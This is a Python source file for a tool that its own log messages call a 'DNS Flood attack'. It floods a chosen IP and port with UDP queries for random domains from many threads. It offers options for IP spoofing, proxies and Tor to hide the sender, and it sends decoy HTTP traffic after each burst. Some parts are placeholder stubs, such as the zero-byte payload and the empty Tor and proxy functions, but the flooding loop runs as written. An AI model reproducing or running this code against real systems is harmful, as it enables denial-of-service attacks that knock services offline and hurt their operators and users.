import socket
import random
import time
import logging
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

class DnsFlood:
    def __init__(self, target_ip, target_port, extensions, max_packets=50000, max_duration=30, interval_range=(0.01, 0.1), log_to_file=False, spoof_ip=False, num_threads=10, use_proxy=False, use_tor=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.extensions = extensions
        self.max_packets = max_packets
        self.max_duration = max_duration
        self.interval_range = interval_range
        self.log_to_file = log_to_file
        self.spoof_ip = spoof_ip
        self.num_threads = num_threads
        self.use_proxy = use_proxy
        self.use_tor = use_tor
        self.is_running = True
        
        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
        if self.log_to_file:
            logging.basicConfig(filename='dns_flood.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

    def get_random_domain(self):
        domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        extension = random.choice(self.extensions)
        return f"{domain}.{extension}"

    def generate_domain_permutations(self, domain, count=10):
        permutations = set()
        domain_parts = domain.split('.')
        base = domain_parts[0]

        while len(permutations) < count:
            permutation = base[:random.randint(1, len(base))] + ''.join(random.choices('09876543210zxcvbnmasdfghjklqwertyuiop', k=random.randint(5, 8)))
            permutations.add(f"{permutation}.{domain_parts[1]}")
        
        return list(permutations)

    def randomize_dns_payload(self, domain):
        # Placeholder: Implement a method to create a DNS query payload
        return b'\x00' * 64

    def get_random_proxy(self):
        # Placeholder: Implement a method to get a random proxy
        return None

    def check_proxy(self, proxy):
        # Placeholder: Implement a method to check the proxy
        return True

    def send_via_tor(self, dns_query):
        # Placeholder: Implement a method to send the DNS query via Tor
        pass

    def send_decoy_traffic(self, target_ip, target_port):
        # Implement a method to send decoy traffic
        decoy_data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((target_ip, target_port))
            sock.sendall(decoy_data)
            logging.debug(Fore.GREEN + f"Sent decoy traffic to {target_ip}:{target_port}")
        except socket.error as e:
            logging.error(Fore.RED + f"Socket error while sending decoy traffic: {e}")
        finally:
            sock.close()

    def attack(self):
        logging.info(f"Starting DNS Flood attack to {self.target_ip}:{self.target_port}")

        try:
            ips = self.generate_multiple_ips(self.num_threads) if self.spoof_ip else [None] * self.num_threads

            def send_packets(spoofed_ip):
                while self.is_running:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    if spoofed_ip:
                        try:
                            sock.bind((spoofed_ip, 0))
                        except socket.error as e:
                            logging.error(Fore.RED + f"Socket bind error: {e}")
                            continue
                    
                    packet_count = 0
                    start_time = time.time()
                    
                    while self.is_running and packet_count < self.max_packets and (time.time() - start_time) < self.max_duration:
                        domain = self.get_random_domain()
                        permutations = self.generate_domain_permutations(domain)
                        for perm_domain in permutations:
                            dns_query = self.randomize_dns_payload(perm_domain)
                            
                            if self.use_proxy:
                                proxy = self.get_random_proxy()
                                if self.check_proxy(proxy):
                                    sock.sendto(dns_query, (self.target_ip, self.target_port))
                            elif self.use_tor:
                                self.send_via_tor(dns_query)
                            else:
                                sock.sendto(dns_query, (self.target_ip, self.target_port))
                            
                            logging.debug(Fore.GREEN + f"Sent DNS query for domain: {perm_domain} from IP: {spoofed_ip if spoofed_ip else 'original'}")
                            packet_count += 1
                            time.sleep(random.uniform(*self.interval_range))
                    
                    sock.close()
                    self.send_decoy_traffic(self.target_ip, self.target_port)

            with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
                futures = [executor.submit(send_packets, ip) for ip in ips]
                for future in futures:
                    future.result()

        except socket.error as e:
            logging.error(Fore.RED + f"Socket error: {e}")
        except Exception as e:
            logging.error(Fore.RED + f"Unexpected error: {e}")
        
        logging.info(f"DNS Flood attack to {self.target_ip}:{self.target_port} finished")

    def generate_multiple_ips(self, count):
        # Generate multiple loopback IPs for testing
        return ["127.0.0." + str(i) for i in range(1, count + 1)]

    def stop_attack(self):
        self.is_running = False
